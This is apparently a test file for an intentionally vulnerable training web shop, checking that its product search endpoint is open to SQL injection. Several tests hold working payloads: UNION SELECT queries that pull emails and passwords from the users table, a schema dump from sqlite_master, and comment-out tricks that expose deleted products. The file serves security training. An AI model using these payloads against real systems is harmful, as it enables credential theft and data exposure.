...
const christmasProduct = config
  .get<ProductConfig[]>("products")
  .filter(
    ({ useForChristmasSpecialChallenge }) => useForChristmasSpecialChallenge
  )[0];
const pastebinLeakProduct = config
  .get<ProductConfig[]>("products")
  .filter(
...
describe("/rest/products/search", () => {
  it("GET product search with no matches returns no products", () => {
    return frisby
      .get(`${REST_URL}/products/search?q=nomatcheswhatsoever`)
      .expect("status", 200)
  ...
  it("GET product search with one match returns found product", () => {
    return frisby
      .get(`${REST_URL}/products/search?q=o-saft`)
      .expect("status", 200)
      .expect("header", "content-type", /application\/json/)
      .then(({ json }) => {
  ...
  it("GET product search fails with error message that exposes ins SQL Injection vulnerability", () => {
    return frisby
      .get(`${REST_URL}/products/search?q=';`)
      .expect("status", 500)
      .expect("header", "content-type", /text\/html/)
      .expect(
        "bodyContains",
        `<h1>${config.get<string>("application.name")} (Express`
      )
  ...
  it("GET product search SQL Injection fails from two missing closing parenthesis", () => {
    return frisby
      .get(
        `${REST_URL}/products/search?q=' union select id,email,password from users--`
      )
      .expect("status", 500)
      .expect("header", "content-type", /text\/html/)
      .expect(
  ...
  it("GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columns", () => {
    return frisby
      .get(`${REST_URL}/products/search?q=')) union select * from users--`)
      .expect("status", 500)
      .expect("header", "content-type", /text\/html/)
      .expect(
        "bodyContains",
  ...
  it("GET product search can create UNION SELECT with Users table and fixed columns", () => {
    return frisby
      .get(
        `${REST_URL}/products/search?q=')) union select '1','2','3','4','5','6','7','8','9' from users--`
      )
      .expect("status", 200)
      .expect("header", "content-type", /application\/json/)
      .expect("json", "data.?", {
  ...
  it("GET product search can create UNION SELECT with Users table and required columns", () => {
    return frisby
      .get(
        `${REST_URL}/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--`
      )
      .expect("status", 200)
      .expect("header", "content-type", /application\/json/)
      .expect("json", "data.?", {
        ...
        deluxePrice: security.hash("F7eqgNr8R2tx5Jf@q7xT^E5!h@g%Sy"),
      })
      .expect("json", "data.?", {
        id: 2,
      ...
      .expect("json", "data.?", {
        ...
        deluxePrice: security.hash(
          "mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb"
        ),
      })
      .expect("json", "data.?", {
        id: 6,
  ...
  it("GET product search can create UNION SELECT with sqlite_master table and required column", () => {
    return frisby
      .get(
        `${REST_URL}/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--`
      )
      .expect("status", 200)
      .expect("header", "content-type", /application\/json/)
      .expect("json", "data.?", {
  ...
  it("GET product search cannot select logically deleted christmas special by default", () => {
    return frisby
      .get(`${REST_URL}/products/search?q=seasonal%20special%20offer`)
      .expect("status", 200)
      .expect("header", "content-type", /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(0);
  ...
  it("GET product search can select logically deleted christmas special by forcibly commenting out the remainder of where clause", () => {
    return frisby
      .get(`${REST_URL}/products/search?q=${christmasProduct.name}'))--`)
      .expect("status", 200)
      .expect("header", "content-type", /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(1);
  ...
  it("GET product search can select logically deleted unsafe product by forcibly commenting out the remainder of where clause", () => {
    return frisby
      .get(`${REST_URL}/products/search?q=${pastebinLeakProduct.name}'))--`)
      .expect("status", 200)
      .expect("header", "content-type", /application\/json/)
      .then(({ json }) => {
        expect(json.data.length).toBe(1);
